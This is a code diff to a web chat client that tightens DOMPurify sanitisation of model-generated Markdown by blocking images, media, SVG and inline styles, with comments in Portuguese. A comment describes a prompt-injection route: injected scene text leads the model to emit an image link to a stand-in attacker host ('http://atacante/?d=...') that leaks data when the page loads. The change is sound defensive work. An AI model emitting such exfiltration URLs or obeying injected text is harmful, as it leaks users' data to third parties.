@@ -135,6 +135,27 @@ function handleMessage(data) {
     }
 }
 
+// Sem mídia nem CSS inline vindos do modelo: um texto injetado (nome de
+// cena, descrição) poderia fazer o modelo emitir ![x](http://atacante/?d=...)
+// e o navegador buscaria a URL sozinho (exfiltração, #25). A CSP da página
+// (img-src 'self' data:) é a segunda barreira.
+const PURIFY_CONFIG = {
+    FORBID_TAGS: ['img', 'picture', 'source', 'video', 'audio', 'iframe', 'object', 'embed', 'svg', 'style'],
+    FORBID_ATTR: ['src', 'srcset', 'style', 'background', 'poster'],
+};
+let purifyHooked = false;
+
+function ensurePurifyHooks() {
+    if (purifyHooked || typeof window.DOMPurify.addHook !== 'function') return;
+    window.DOMPurify.addHook('afterSanitizeAttributes', node => {
+        if (node.tagName === 'A' && node.hasAttribute('href')) {
+            node.setAttribute('target', '_blank');
+            node.setAttribute('rel', 'noopener noreferrer');
+        }
+    });
+    purifyHooked = true;
+}
+
 // Renderiza Markdown sanitizado; sem DOMPurify ou marked, cai para texto puro (nunca HTML cru)
 function renderMarkdownInto(element, content) {
     const text = content == null ? '' : String(content);
@@ -143,7 +164,8 @@ function renderMarkdownInto(element, content) {
         && window.DOMPurify.isSupported !== false;
     const canParse = typeof window.marked !== 'undefined' && typeof window.marked.parse === 'function';
     if (canSanitize && canParse) {
-        element.innerHTML = window.DOMPurify.sanitize(window.marked.parse(text));
+        ensurePurifyHooks();
+        element.innerHTML = window.DOMPurify.sanitize(window.marked.parse(text), PURIFY_CONFIG);
     } else {
         element.textContent = text;
     }
